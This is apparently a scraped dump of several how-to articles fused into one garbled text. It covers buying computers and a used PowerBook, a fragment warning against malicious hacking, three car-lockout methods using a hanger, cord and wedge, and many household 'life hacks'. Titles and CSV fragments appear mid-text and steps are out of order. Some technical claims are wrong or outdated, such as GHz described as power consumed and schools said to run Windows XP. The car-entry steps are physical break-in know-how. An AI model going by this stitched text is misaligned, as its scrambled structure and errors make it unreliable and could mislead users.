Connect the external drive using a USB connector cable, typically included with the drive at the time of purchase. The computer can then be configured to boot to the external drive, instead of the internal drive installed on a pre-assembled system.
Install the preferred operating system on the external drive once it has been connected. Follow the instructions included in this article for accessing the BIOS feature and installing the preferred operating system.

, The operating system installed on a pre-assembled system can be erased and replaced with the preferred operating system.


Change the BIOS settings to boot to CD.
Restart the computer and open the BIOS configuration interface by repeatedly pressing the assigned hot-key. The assigned hot-key will vary by BIOS manufacturer, but is typically listed on the bottom of the screen just after the computer is turned on. In most cases the hot-key for opening the system BIOS will be the Delete key, the F1 key, the F2 key, F11 or the F12 key.
Insert the operating system disk or USB into the optical drive. Once the BIOS has been set to boot to the CD, or optical drive, insert the operating system CD and follow the instructions as prompted to format the hard drive and install the new operating system.

Purchase and enjoy your computer.",How to Buy a New Computer," Is it for home use, work, gaming, or even art? Work computers have different uses and different needs, from cash registers to high-end computers capable of performing real-time 3D animations.


Creativity and tablets definitely go together for artists, especially in regards to Apple and Windows devices -- artists can now use high-powered tablets with various types of styluses for art, most notably Microsoft's digital pen for Surface Pro and Apple's digital pencil for iPad and iPad Pro; there are even digital paintbrushes of various sizes and types. With a Windows machine you can work in the full version of Adobe's Creative Suite programs, whereas with Apple's iOS devices also have a rich amount of apps to choose from.For high-end gamers, choices may be more limited, Windows or Mac are the best choices here, with Windows in particular getting the most games and sometimes getting a given game first. Dell's Alienware division specializes in laptops and desktop PCs that look futuristic and are high-powered enough to handle the most processor- and memory-intensive games available.;
, You have the choice between desktop, laptop, tablet, or hybrid. Hybrid PCs can be clamshell or other models of laptops that can transform into tablets, like Lenovo's Yoga or the Surface Book from Microsoft. Rest assured, you can also get standard laptops and desktop machines, too; these older style PCs are a lot cheaper than they used to be unless you tack on snazzy new features such as touchscreens, built-in cameras, fingerprint readers and even face recognition login software – some of which you may not need: a touchscreen isn’t terribly useful on a desktop monitor, for example.

, OSX is only runs on Macs, whereas with Windows you have many more choices of hardware manufacturers and configurations. This is because Windows supports a vast amount of modern hardware natively. Some particulars to know about your various choices include:


When considering Mac or MacBook, know that Apple's OS X is based on the FreeBSD variant of Unix, and as such is a stable, smooth-running operating system not prone to anywhere near the amount of viruses or ""glitches"" that makes Windows so famous for being buggy and insecure. Apple makes simple-to-use but powerful Mac desktops and MacBook laptops. Unlike with Windows there is no Mac tablet available, exactly: iPad and iPad Pro run iOS, not OS X, and so you cannot use Mac apps on iPad or iPad Pro.
Windows PCs and tablet computers are the most prevalent computers used for home and business. From Microsoft's Surface Pro tablets and Surface Book laptop/tablet hybrids to similar devices from HP, Dell, Lenovo, and other Windows PC manufacturers, these devices are all backed by the wealth of Windows software available on the market.Google's Chromebook is essentially an Internet terminal that runs Internet-based apps, such as Gmail and Google Docs, and runs the open source Chrome operating system that's based on Linux. Chromebooks -- and Chromeboxes, their desktop equivalent -- are typically less than $1000 -- and in some cases less than $200.
Linux is a free, open source operating system that gives you access to the very center, or kernel, of the operating system. You can install Linux on just about any Windows or Mac computer, and Linux is the foundation of both Google's Chrome and Android operating systems. There are a wealth of free apps available for Linux and many different versions, called ""flavors"" by Linux faithful, of Linux to choose from., Firstly, if you want your computer to be a tablet, Apple offers iPad and iPad Pro, but as mentioned earlier the iPad won't work with Mac software you may have, such as the full version of Microsoft Office for Mac. Windows tablets offer the full version of Office and the wealth of Windows applications on the market in tablet form. However, iOS devices (iPhones, iPods, and iPads use the iOS operating system) have a wealth of apps in the iTunes store and Android devices also have a wide selection of apps in the Google Play Store.

, Most of the newer, more powerful computers cost well over the $1,000 to $2,000 range. Remember, though, that with a desktop PC in particular, and to a far less degree with laptops, you can choose to upgrade the machine later and so don’t have to spend a fortune immediately as long as you get a system that can be upgraded later. Also bear in mind that the smaller and more powerful a device is, the likelier it is to cost more; put simply, if you want a gaming-level machine in your hand with a ton of RAM and a powerful processor, you’ll pay more for it.

, This has a lot to do with your price range; you can save a significant amount of money buying something a year or so old, particularly as fast as technology moves in today's world, but if you want brand-new with a warranty you’ll pay more.

, Don’t need a huge screen? Don’t pay for one. Need a lot of random access memory (RAM) but not too much processing power? You decide. Play around with purchasing tools at your favorite manufacturer’s Website (e.g. Lenovo.com, HP.com, etc.) to see what different options cost and take those off you don’t need to see how much you can save towards your pocketbook or towards features you want to beef up, such as processor power, RAM, or whatever.If you want to customize your purchase, you really can’t do so buying a used computer unless you’re buying refurbished equipment from the manufacturer.
Some mobile devices in particular aren’t very customizable, such as the iPad Pro, Android tablets, or Windows tablets; however, you will typically have multiple configurations to choose from at different price points.

, If you want brand-new equipment with a warranty, you’ll want to go with a manufacturer or retail site, most likely, whereas if you don’t mind used, OfferUp or Craigslist might be your first choices. This way you can find what you want locally and avoid shipping fees and waiting time. You can use the Craigslist search feature to isolate certain models you want. Searching for “Lenovo” in the search box will filter out any ads that don’t feature the word “Lenovo,” for example. You can find PCs in the “Computers” or “Electronics” under “For Sale” on the main Craigslist page or much more rarely in the “Free” section also under “For Sale.”

, Look for machines you’re interested on eBay and at sites like TopTenReviews and ConsumerReports. Not only will you get a good price view of what your model is going for, you can get feedback and history on previous models to help you decide whether the newer model will potentially have similar problems as the old.

, Search at the manufacturer’s site, at eBay, Target and other retail establishments, and take advantage of any standard sales days you can take advantage of, such as Black Friday in November.

, With all that work, you deserve it!

Realize that the Apple PowerBook is outdated.,
Determine why you want to buy a PowerBook.,
Scope out eBay and your classified ads such as Kijiji or Craigslist.,
When you get your PowerBook, set it up based on what you intend to use it for.",How to Buy a Used Apple Powerbook," The Apple PowerBook is based on the PowerPC architecture that has not been supported by Apple for some time. They're limited when it comes to expandability and software support; the latest version of Apple Mac OS X to run on any PowerPC-based Mac is Mac OS X 10.5.8. They also tend to retain their value and can easily exceed $250.


The PowerBook, while not good as a main computer, can still manage as a secondary machine as long as a later G4-based model is used.;
, Many people who buy used Apple PowerBooks often buy them for collector's value, such as the earlier G4-based PowerBooks, the G3-based PowerBooks and earlier. Some people do buy them because the later PowerBook G4s look quite modern, and as they are from Apple, they may feel that they can score an Apple computer without paying the premium, but the PowerPC architecture which they are based on is very old and won't provide the same experience as even the earliest Intel MacBooks from Apple.


If buying for collector's value, look for a PowerBook that is in decent cosmetic condition and is operational. Buy the PowerBook that you want, but be careful - these PowerBooks can cost a lot of money if they're in decent cosmetic condition.
If buying as a secondary computer, look for a PowerBook G4 which features a PowerPC G4 processor of at least 1.33GHz with at least 1GB of memory.

, PowerBooks can be relatively easy to find on eBay, but do expect to pay a premium for shipping and handling. It also wouldn't hurt to ask your friends or extended family if they have one, and would be willing to part with it.

,


If using your PowerBook as a secondary machine, update it to the latest version of Mac OS X, which will be 10.5.8 on the later G4s.
With Mac OS X 10.5.8, the latest versions of Safari, iTunes and iLife that can be used with it are 5.0.6, 10.6.3 and iLife '09.
YouTube videos aren't watchable in the Internet browser; however, a free application called MacTubes can be used to watch and download YouTube videos without the issues of running it in the browser.
For office work such as creating and editing word documents, slideshow presentations and spreadsheets, LibreOffice 4.0 is an excellent, yet free program that works on PowerPC Macintoshes.

, They hack primarily for their own selfish gain, to inflict pain into people's lives, and for self-entertainment. Not only is it illegal to hack people's computers, but if you are caught you could do some jail time and you will find it next to impossible to attain a job with any kind of contact with computers. Companies do not want someone who has a history of hacking with malicious intent (think about it, why would a computer company employ a hacker who may hack them?). Use your skills to help people, there are so many really awesome jobs for ethical hackers.

, Hacking tools can be great help in the process, but most tools are investigated by the companies they exploit, and therefore they don't usually work for long. If you understand the underlying concepts of programs and the operating systems, then with this knowledge, you can create your own exploits.

, This isn't really related to script kiddies, but hackers in general often become so absorbed with their various projects on the computers, that they ignore their friends, or simply don't make friends.

A wire coat hanger works well, but you must straighten it first.A universal unlock tool or a “slim jim” also work in this case if you’re prone to locking your keys in your car and want to keep one around for future occurrences.;
, Though the hanger mostly needs to be straight, you will need to keep a hook bent into one end. This hook will need to catch on the lever arm of the locking mechanism inside the car door.









The hook should be roughly two or three inches long., In order to reach the locking mechanism lever in the door, you must feed the hook end of the hanger into the small space between the bottom of the window and the weatherstripping the helps seal and cushion the window in the door.








You will need to feed the hanger down several inches, and you will feel when the end of the hook slips down past the window.

, The mechanism lever will run parallel to the car door, so you’ll need to turn the hanger close to 90 degrees to make sure the hook faces perpendicular to the lever and can catch it.







, This part is not an exact science and depends on the specific car. You will have to fish the hook around inside the workings of the door to find the lever.









The lever will likely be slightly behind the actual lock placement, so use the hanger within a few inches of the manual lock tab instead of directly next to it.You will see the manual lock lever shake and jiggle when you make contact with the lever arm, so keep fishing around until you see it start to move., Once you feel that the hook in the hanger is around the lever arm and you see the manual lock moving, then you simply need to jiggle and lift up on the hook to finish unlocking the door.








Since the lever arm is stronger than the hanger, it may bend your hook out of place. Pull the hanger out, reshape the hook, and reinsert to at the same spot. It may take several tries, but as long as you see the manual lock jiggling, then you know you’re in the right spot.

, If you cannot seem to get any leverage by going beneath the window, you can always try one of the other methods, or you can simply call a locksmith. With the professional assortment of tools a locksmith will have available, they’ll have you back in your car within minutes.

Get a long piece of paracord or a long shoelace.,
Tie a slipknot in the center of the cord.,
Feed the cord into the doorjamb.,
Work the cord down into the vehicle.,
Position the slipknot loop over the manual lock.,
Pull the slipknot tight on the lock.,
Unlock the door.,
Call a locksmith.",How to Open Locked Cars2," This method is also meant for vehicles with vertical manual locks that are just inside the window and which you must pull up in order to unlock the vehicle. Start by getting a long, thin piece of paracord or even a long shoelace.If you use a shoelace, then it will likely have to come off a pair of boots because it will need to be at least approximately three feet in length depending on your car doors.

, For this method, you will work the cord inside the vehicle and tighten the slipknot over the manual lock to pull it up, so you will need to make the slipknot in the cord before feeding it into the vehicle.








If you do not know how to tie a slipknot, visit How to Make a Slip Knot to learn how.
You want to leave roughly two-to-three inches in the slipknot in order to make it easier for the loop to fit over the lock before you tighten it.

, Start at the top corner of the door and pull at it to make a bit of space between the door and the rubber seal, and then push the slipknot portion of the cord between the door and the frame., You will probably find it easiest to get the slipknot down to the lock by using a sort of sawing motion to work the cord down. Tease one end of the cord down toward where the door handle and tease the other end of the cord toward the side mirror, and then work them back and forth to pull the knot lower.You may need to use something with a little bit of a wedge to it such as a door stop to hold the corner while you push the cord between the door and the frame.
Make sure you only actually pull on one end of the cord at a time. If you pull on both, you’ll just tighten the knot prematurely.

, After you’ve worked the cord down far enough, you will need to position it above the lock and with the loop facing the correct direction. Since the door will force the cord slightly deeper into the car than the position of the lock, you can twist the cord once it’s above the lock to swing the loop over it., Once you have the slipknot in place over the manual lock, you can tighten the slipknot. Pull both ends of the cord to tighten the knot, but make sure to pull slowly so that the loop doesn’t redirect off the lock as it tightens., Once you have the knot nice and tight over the lock, you can simply pull up on the cord to pull the lock up and unlock the door. This is especially easy for vehicles with manual locks that have a concave shape. If your lock has a smoother shape, you will have to pull up at an angle rather than directly up in order to keep the knot from slipping off the lock.







, If you cannot seem to get the cord past the doorjamb and none of the other methods will work for your vehicle, you can always call a locksmith.

Straighten a wire hanger.,
Snip off the twisted section at each end.,
Shape the wire hanger.,
Pry open the car door slightly.,
Work the wedge in deeper.,
Insert the wire through the gap.,
Use the hook to grab the door handle.,
Use the circle to press the unlock button.,
Open your newly unlocked car door and hit the road!

,
Call a locksmith.",How to Open Locked Cars3," Since this method involves extending the hanger into the actual vehicle, it tends to work better for vehicles with power door locks or a lock that automatically unlocks when you pull the interior door handle. You will need a long rigid tool that won’t bend under a bit of tension in order to reach in and either press the unlock button or pull the door handle. The most common household tool will likely be a wire hanger after you straighten it. A rib from an umbrella or a long wire from a wire basket will work as well.


You can also buy a specific tool kit for this method online, which consists of an inflatable bag, a wedge, and a rigid tool.If you are prone to locking your keys in your car, it could prove to be a good investment.

, Use a pair of wire cutters to snip off the twisted section at either end where the hanger came together. This section is typically to difficult to straighten completely and is hard to slip into the doorjamb.









Cut as close to the base of the twisted section as possible in order to retain as much length in the wire as you can.

, Make a small hook with the end of the wire hanger if you will be opening the inside door handle itself. Make a small circle if you will be opening a vertical lock or pressing an unlock button.









Make sure that the hook is large enough to grasp the handle, and that the circle can just barely fit over the button so that it snags when you pull it up.

, You need to get something into the car doorjamb just enough to give yourself some leverage.You can use an inflatable pump wedge, which is a small inflatable bag that safely creates an opening in your car door or window.








If you do not have access to an inflatable bag, you can use any sort of tapered rubber material. Two or three door stops will also work well if you insert them a bit at a time to get a good wedge. Use rubber to prevent scratching your car's paint.
Make sure to pry under the weather stripping and only pry enough to insert the wire through.
Leave the object you inserted in the door jamb as you complete the next step.

, Once you have something with a bit of leverage behind the door, you need to pry a bit more to open the space wider.Even if you used an inflatable pump wedge, you should still have one or two actual rubber wedges or even wooden ones with plastic guards. You will have to work these wedges deeper into the jamb until you have enough space to insert your wire hanger.








, If you are trying to open the door handle, you should insert the wire horizontally through the side of the door. If you are trying to unlock a vertical button, you should insert the wire downward vertically from above the door.









If this proves too difficult on the driver’s side door, you can always try the passenger side as well since most modern vehicles with power door locks will have a control on the passenger side as well.
Be careful not to scratch the paint on your car as you complete this step.

, If opening the handle itself, direct the wire onto the door handle and grab onto the handle with the hook you bent into the wire. The hook will usually be pointing down and slightly toward the inside of the car in order to achieve the best angle.







, If pushing a button or pulling up on a vertical lock, direct the wire from the top of the window toward the button and perform the necessary action. For a button, simply press down with the end of the wire until the doors unlock. For a vertical lock, push the loop you created in the end of your wire down over the lock and pull up until the car unlocks.









It is important that the loop is just barely wide enough to slide over the top of the vertical lock so that you can pull it back up.

,, If the door to your vehicle proves too difficult to pry open to get the hanger inside with enough room to maneuver it, then you may simply need to call a locksmith. They will have professional tools to get you back inside your vehicle in no time.

Warm up leftover pizza in a frying pan or skillet.,
When pouring milk in cereal, place your spoon upside down in the bowl.,
To remove the yolk from the egg, use a water bottle.",How to Use Life Hacks2," It works because bubbles and foam created from boiling water are filled with steam. If the bubble touches something that has a temperature below 100°C, the steam will condense (change back into a liquid) and break the surface of the bubble.

, Everyone's been there: they're trying to cook the ultimate Thanksgiving dinner, but have to keep running across the room to look at the cook book and end up burning the food. To avoid that, simply clip the book into the pants hanger, and hang it from any open cupboard handle.

, Wring the paper towels out slightly, so the water does not drip all over your freezer. Leave the drinks there for fifteen minutes, and by then, it will be ice-cold. Good if you are using a bottle, or have no ice in the freezer.

, With the batter stored safely, you not only provide a mess-free counter, but can use it later without having to go through all the trouble of covering a bowl, then cleaning the drips from the counter and range. Use a funnel to get the pancake batter into the small opening. Bonus life hack: make the funnel from a bottle!

, These small muffin bakers will keep condiments separated from each other, so no gross mustard-relish mayonnaise messes will occur. It also makes for an easy cleanup.

, Not only is this method quicker and more efficient, it keeps all the extra strawberry you usually cut off intact. Start from the bottom, and push up until the stem pops out.

, Place half a lemon in between the two sides. Pull down on the sides usually meant for picking up meat. This will get almost all the juice out of a lemon. Clean fully afterwards.

, The flexible string is thin enough to cut. Hold it tightly with two hands, and pull it through. This uses the same principle as using a wire to cut clay.

, Cut the top off any water bottle, or juice bottle. Next, pull the top of the bag through the loop made from the top of the water bottle you've just cut. Fold the bag over the top of the bottle, then screw on the lid to make an airtight seal.

, It helps your mind to think there's more food, and limits what you can pile on.

, The water will come near to boiling, softening the noodles and allowing you to cook them. Cook them the normal time you would in a pan. Do not cook sauce in the coffee maker, however. This also works for hot dogs.

, Don't have a coaster on hand? A plain lid can do wonders! Just place your drink on top and you've got a neat coaster. Make sure to clean before using.

, This helps keep the pizza crust from becoming soft and dry. If desired, add a tiny bit of oil.

, This will prevent the milk from splashing all over the table and turning into a mess.

, Crack the egg, and squeeze the bottle slightly. Place the opening over the yolk, and the yolk will suddenly be sucked in.

, These take up much less space, and actually hold large towels much better. It also helps them to dry faster.

, Use sticky magnetic so as to not damage your walls. Make sure all your clips are magnetic before attempting this.

, Before you try this in the bathtub, put a piece of paper inside the bag, then completely submerge it. If the paper is wet, then the bag is not completely waterproof, and should not be used. Ziplock bags work the best.

, This will scrub everything very well, and as the Scrubbing Bubbles say, ""We work hard so you don't have to!""

, This will save the space of having a bedside table, and will give off much more light. To make a DIY one:


Buy some craft wire
Twist it using pliers
Attach Christmas lights to it

, Instead of buying an ugly beige one, use colorful fabric and sew one using an embroidery hoop. Find a sack/sew a sack, then wrap the top around the embroidery hoop and sew.

, Stir it around and start painting. For every half a liter of paint, add one teaspoon of vanilla essence or extract and mix with a paint mixer. In the end, the room won't smell like that terrible paint odor, but instead smell like pure vanilla.

Pair socks before washing and safety pin them together in the wash to avoid having to re-pair them.",How to Use Life Hacks4," Take beeswax (the lubricating type), and rub it over your shoes. Make sure you cover every part on the outside, and regularly touch up if the beeswax is coming off. Use a blow dryer or any type of heat to melt the surface of the wax, therefore making it invisible.

, This method is much easier and effective than taking out the full iron, waiting for it to heat, then putting everything away. Borrow your girlfriend's/sister's/wife's/daughter's straightener, or simply buy a cheap one from your nearby pharmacy.

, Gently blot with a cloth soaked in white wine to remove the stains. Test first on a piece of scrap fabric, in case it stains your clothes more.

, Windex can be used to safely restore the sheen to patent shoes. Spray the affected area, then wipe gently until the stain/mark comes off.

, This will help avoid the single sock search around the house. Use a safety pin, or other device that is water safe and will stay on when tossed around.

Use a tennis ball to make an easy key holder.,
At the end of your toothpaste, place a binder clip to get every bit.,
Soak crusty paint brushes in vinegar for half an hour.,
Make a dustpan from a plastic gallon milk jug.",How to Use Life Hacks5," Place the bucket or other large container on the floor directly in front of the sink. Place the larger end of the dustpan inside the sink, so that water can easily flow onto it. Place the handle sticking out of the sink, so that the water will fall into the bucket.

, Instead of going to the locksmith and purchasing colored copies of the keys, why not make brighter, more colorful, personalized, and 'free' ones at home? Nail polish works better than other types of paint. Gel nail polish works the best, but any type will do.

, The bottles fit perfectly, and if you get a mesh or clear pocketed one, you can even see the labels easily. Best of all, it takes up no floor space whatsoever.

,  Start by putting a little toothpaste on a rag, and rubbing in circular motions, until headlight is covered.  With  toothpaste, you may get 2-4 months out of it, unless you apply a wax, or something like Opti-coat, clear coat, or other sealant to your headlights to block the UV rays and keep them from getting hazy again.  Toothpaste is a mild abrasive, so it naturally works well to polish things, and fill small scratches. Just don't use any kind of toothpaste with cooling crystals or anything like that, as they will scratch the surface badly. Regular whitening toothpaste works fine.

, Use different removers for each type of object:



For fabric: Use hand sanitizer.

For skin: Use rubbing alcohol

For walls: Use hairspray or toothpaste

For wood: Use rubbing alcohol

For carpet: Use white vinegar

For dry erase boards: Cover with white board marker.

For furniture: Use milk

For ceramic or glass: Use 1 part toothpaste, and 1 part baking soda.

, Cut a slit in a tennis ball. Add eyes, then attach a hook velcro to the wall to attach the tennis ball. You can also use this as a towel holder, or a pen holder, or a letter holder.

, This can be useful to prevent excess from going down the drain and being wasted.

, The chemicals cause the bristles to release and soften.

, First, the bottom off of the jug. Then cut a long slit across the straight ridge just under the handle of the jug, then cut down the jug from each end of the slit in the shape of a scoop. This can be useful if you lost your dustpan or need an (almost) free one.

, Tie a rubber band over the latch. Make an eight shape, then hook it over each knob.

, Cut each pool noodle into quarters, then cut down one side of the noodle. It doesn't have to be straight, but it helps if it is.This method also adds some bling to the trampoline!

, This also provides a backrest your child can lean against, and sides to hold onto.

, Buy a roll of oilcloth or plastic, and duct tape it to the table. You could also simply cover it with duct tape.

, Fold the sheet in half, and loop it over the top of the hula hoop. Tie it to a tree to keep it standing up.

, The baby will want to suck on it, and will not realize it is medicine. Make sure to completely clean the pacifier before giving it back to the baby.

, Turn the sheet diagonally, then tie the ends over the table. Tie the other ends over the baby to help avoid falling babies.

, Whenever you go out in public with your child, have them wear the bracelet. If they ever get lost they can use the number on the bracelet to call for help.

, Place each pool noodle at the edge of the bed. Cover and tighten their bed with a sheet. Whenever you child is close to falling down they won't, because of the protection of the pool noodle(s).

, Cover it with a blanket, and fill it with toys and pillows. The best type to buy is one with an inflatable bottom as to provide a soft space even when the baby walks.

, Bend the clip to the two shiny extensions are facing opposite, then stick the black head into the square hole in the back. This should keep your keyboard titled slightly downwards.

, Clip them to the side of the table (or computer, book, etc.) Most of the commercially available cords have heads that are larger than the tops of the clips, so this should work with most, if not all of your cords. Say goodbye to the jumbled mess of tangled cords!

, For smaller cords, you can simply stick them inside a roll all tied up, and they'll stay there. Larger cords can use them as ""loop holders"". This is a great way to organize extension cords, chargers, headphone cords, or any other cords you may have.

, Tired of sleeping past your alarm? This will make the sound much louder. It's the same principle as using a cup for a speaker. Put the phone so the speaker is face down.

, Fold the lid backwards, and place the case upside down. Bigger smartphones, such as the iPhone 6/6+, Galaxy Note 4 and the Nexus 6 may not fit.

Determine how powerful your computer needs to be.,
Consider what operating system to use.,
Research your options - there are many ways to get discounted or inexpensive computers.,
Start saving money.,
Buy your computer once you have enough money.",How to Buy a Computer While You're Young," For your first computer, you probably want to buy a computer that is of a basic standard, about 2.1Ghz processor, 1 to 2 GB of memory (RAM) and average graphics. If the machine isn't going to be used for intense photo editing (i.e. Photoshop), movie editing or gaming (none of which a young user would be likely to do) then graphics needn't be a major consideration.;
, Linux is generally your least expensive option, followed by Windows; Mac tends to be the priciest. Bear in mind that most computers come with Windows, the system that most people are familiar with. Most schools likely use Windows XP, so a machine with this installed, whilst now a rare occurrence, would be safest in terms of familiarity.

, Often, a quality computer that is a few years old will still perform very well and cost less than half of its original price. Bear in mind however that if using a website like eBay, you should carefully check the seller's feedback first; if they've been a problem before, it's likely they will again. Additionally, IF A DEAL SEEMS TOO GOOD TO BE TRUE, IT PROBABLY IS. It's a sad reality, but there are people using websites like eBay to entice people into what seems like a good deal, and then not providing the item you pay for.

, If you are provided an allowance, you should set aside some of that every time you are given some. Offer to do extra chores around the house, or help a family member or neighbor. Many local newsagents will take on people of around 13/14 and upwards to do paper rounds.

, Be sure to ask someone who knows about computers their opinion; if they tell you it's not a good deal, then it isn't a good deal. If you go to a shop to buy your computer, be sure to take someone tech-savvy along with you. They can help to get you the computer that's just right for your needs. Also make sure you know what technical support you get with the computer; if you buy a machine that only comes with a repairs and support warranty for six months and it breaks after eight, you've wasted a lot of money.

Cheetos, Fritos, and the others like that also burn well. The reason they burn is because it's basically pure hydrocarbons (which burn) soaked in fat (which burns). Maybe another life hack would be to stop eating them?

, This quick and easy method only requires one holder. The ones with foil on the edges work best, but any type will do.

, Tie them in a knot first, then plug in the ends. This should keep one end from pulling out.

, Use all the sunscreen, then clean out the bottle by rinsing it, putting it in the dishwasher, or soaking it to get rid of all the oils. Make sure to use an inconspicuous bottle so you don't attract attention.

, That way, the bee will not feel as threatened to sting. When being blown, bees will most likely think the wind is moving.

, Roll the foil into a line, then unravel the end, making it into a spoon shape.

, Unlock your smartphone's screen, or use a flashlight app if desired. Place the phone beneath the Gatorade bottle. Your surrounding environment should immediately become much brighter, thanks to the bottle's light-distributing qualities. The Gatorade bottle will send your phone's light beams out in a wider range, helping to illuminate a larger-than-expected sized area around itself. You can use a full bottle of Gatorade and create colored lights.

Ask about a finance plan.",How to Buy a Computer," To help you decide, you should write a list of the tasks you plan to perform. Surfing the web, word processing, and spreadsheets (basic usage) will require a less complex computer than digital audio or video production will. If you plan to multitask, make a note of that, as well. Desktop computers are available in these forms:


Full-size computers are inexpensive, easy to repair and upgrade, and come with the widest options of features. Their main disadvantage is the large amount of space they take up.
All-in-one computers combine the central processing unit (CPU) and the monitor, taking up the least amount of space. On the other hand, they’re very expensive and difficult to repair and upgrade.
Gaming computers are large, very expensive, and designed with the serious gamer in mind. They have a large amount of memory, high-quality sound and graphics cards, and fast processors.;
, Chromebooks are inexpensive, small and, lightweight. If you work primarily with word processing or spreadsheet software, this is a good choice. Its main disadvantages are limited storage space and limited memory. If you choose this option, you’ll need regular access to the online cloud storage., They have fast processors and lots of storage space. Smaller models are lightweight but still have most of the perks. However, larger options have displays that are easier on your eyes. They also give you a wider range of features., Tablets are very lightweight and can be used almost like laptops. Their batteries can hold a charge for anywhere from four to 13 hours. On the other hand, if you use a computer for productivity tasks, you’ll have to buy keyboard., If a computer looks appealing to you based on its stats and your personal needs, get the public's opinion. Ask friends, family members, and trusted staff at electronics stores. Read reviews of the computer and do your research. After all, you don’t want to end up with a dud that just looked cool.

, The core storage drive of a computer may come in the form of an traditional hard disk with moving parts or a stationary solid-state drive. Solid-state drives (SSDs) are faster and use less power than hard disks. They’re also less prone to freezing when running multiple programs at once. Bottom line: if you’re a multi-tasker, go for the SSD.If you can’t decide between a hard disk and a solid-state drive, you could choose a hybrid drive which combines the two. With a hybrid you get the speed of an SSD for a lower cost. On the other hand, its hard-disk parts are fragile and can be damaged if you drop your computer.Optical drives, which play CDs and DVDs, are becoming less common on laptops. If you can’t find a computer with a built-in drive, buy an external drive that you can attach with a USB cable., The larger your computer's hard drive, the more information you can store on it. Hard drives usually come in sizes of 180 gigabytes (GB) to 320 GB.Consider your intended tasks on the computer. Ask yourself if these needs could change over the next few years.


For example, your immediate need might be enough space to hold word documents and spreadsheets. However, you could find music and video files that you’d like to store for later. Your friends could begin sending pictures of the kids’ latest milestones. These files will require more space than smaller files.

, The more random access memory (RAM) memory your computer has, the more applications it can run simultaneously and the better it performs overall. If you plan to stick with basic usage, go with a standard 4GB RAM. If you’re a serious gamer, on the other hand, go with 16GB or higher.You can also buy additional RAM later if you need it. RAM tends to be rather inexpensive, regardless of the system you’re using.

, Look at the both the number of cores and the number of gigahertz (GHz). Cores determine how fast your computer runs. GHz measure the amount of power consumed. For example, a 1.5 GHz quad core processor runs faster than a 2.0 GHz single-core. Your requirements will likely fall into one of four categories. With each one, you have a range of processors to choose from:Basic usage (web surfing, emailing documents, productivity tasks): Intel Celeron, Pentium, AMD A4, or AMD A6.
Basic gaming (single-player applications): Intel Core i3, AMD A6, AMD A8.
Watching videos and basic gaming: Intel Core i5, AMD A8, AMD A9, or AMD A10.
Video editing and serious gaming (multi-player interactive games played online): Intel Core i7, AMD A10, or AMD A12.

, For most computers, you’ll have to decide between Windows and Mac. Windows systems are less expensive, more common, and can interface with the Xbox. However, they’re more vulnerable to malware like viruses and ransomware. Mac operating systems are less vulnerable to cyber attacks and usually update automatically with a high-speed Internet connection. Tech support at the Genius Bar in any Apple Store is free indefinitely. It’s free via phone only for the first 90 days., If you’re buying a laptop, remember that the more power your computer consumes, the shorter its battery will last. New Mac batteries can last for up to six hours if you’re only creating documents. Surfing the web and watching videos can reduce battery life to about two hours. Windows batteries have a shorter life before you need to charge them. Dimming your display will extend battery life by anywhere from a few minutes to an hour.


Newer models of Macbooks, Ultrabooks, and tablets don’t have removable batteries.On the other hand, you can remove the batteries in older Macs.With care, these batteries can last for five years before you need a replacement.

, If you’re not buying an all-in-one or portable computer, you’ll need a separate monitor. These days, monitors are powered by cathode ray tubes (CRTs), liquid crystal displays (LCDs), and light-emitting diodes (LEDs).


CRT monitors are the old-school kind powered by the same technology as traditional television sets. They’re very inexpensive at first but are very expensive to repair. They’re also very bulky and have fallen out of favor with most users.
LCD monitors don’t flicker as much as CRTs, which is a plus if you suffer from headaches. They’re also lightweight and take up less space than CRTs. On the other hand, they’re very expensive, and their resolution can also get distorted if you connect projector cables.
LED monitors are the most eco-friendly option because they require the least amount of power. Like LCDs, they’re lightweight. However, their image resolution is better than LCDs. Their only disadvantage is their high price tag., Go with a larger display if you work with graphics or spend several hours in front of the screen. Choose a smaller size if you’re frequently away from the computer and work primarily with text. The larger the monitor or screen, the more information you can view and the higher the resolution you can view it in.Newer laptop screens feature glossy coatings that may make it hard to read them outdoors or under strong indoor light without adjusting the screen brightness.

, If you’re buying a desktop computer, you’ll definitely need a mouse. Some mice are cordless, using a USB stick to connect to the computer. Others connect to the CPU or monitor with a cable. Mice are mainly available in optical form. An optical mouse replaces the old track ball with a red light on the bottom and is more likely to navigate smoothly over the years., Dedicated graphics and sound cards generally provide better video and audio capabilities for desktop computers. Most feature their own memory chips, with more memory meaning greater performances. If you choose high-quality graphics and sound cards, be prepared to pay extra., Ask yourself how many external objects (printer, scanner, external hard drive, etc.) you want to connect to your computer. Most computers have at least two USB ports, and some have three or four. Other connectors include:


HDMI or DVI connectors for connecting to a TV set
VGA for connecting to a monitor
Firewire for connecting to a video camera.
Ethernet port to connect your computer to a broadband modem (if you don’t have a WiFi router), These days, a mere typo in a URL could infect your computer with malware. Don’t put your files at risk. Invest in an external hard drive. Even the most serious scholars saving gigabytes of data should be fine with a 1-terabyte hard drive. Connect it to your computer through the USB cable or a Firewire. From there, you can start backing up all your files to your external hard drive.


If the drive is brand new, you should receive visual prompts from your computer. For example, if you use a Mac, you will see a prompt asking if you would like to sync your drive to Time Machine. If you choose this option, your computer will automatically back up your files every time you connect the external hard drive.

, Most new and refurbished computers come with a one-year warranty. Whether you buy an extended warranty is up to you. Get the warranty if you’re buying pre-owned or if you’re prone to spilling beverages on electronics. Avoid it if the computer is brand new or if the warranty is more than 20 percent of the price of the computer., Determine a limit for what you’re willing to spend. Don’t get tempted by software you don’t need. You can usually get a decent desktop computer system for under $1,000, unless you need the additional features of a more expensive system. Laptops tend to cost more than desktop computers with equivalent features, but you can buy most for less than $1,000.


Generally, Apple computers tend to be more expensive than computers that run either Windows or Linux. However, they’re popular with users who do a lot of graphics work. They’re also less vulnerable to malware.

, Usually, they’ll drop the price of the soon-to-be old model around that time. If you don’t worry about having the latest technology, you should consider this option.


Different manufacturers have different schedules. Some introduce and phase out models throughout the year. However, most refresh cycles tend to fall during these times of the year:

Back-to-school (June-September)
The holiday shopping season (October-December)
Spring (February-April), Do this if money is especially tight. Refurbished computers cost considerably less (as much as 20 percent) than brand new computers and run just as well. In fact, many refurbished computers have never been used. Buy only from reputable sellers or manufacturers like Best Buy or the Apple Store. Make sure your refurb comes with at least a one-year warranty., If you’re a student, educator, or member of the military, have your ID ready. You might be eligible for a five- to ten-percent discounts off the retail price of your computer. Your student, faculty, or military ID must be current.

, When you buy on installment, you pay a certain amount up front (about 10 percent) and continue to make monthly payments until your computer is paid off. Ask about interest rates and whether the store finances through a third party. Read the fine print before signing off on anything.

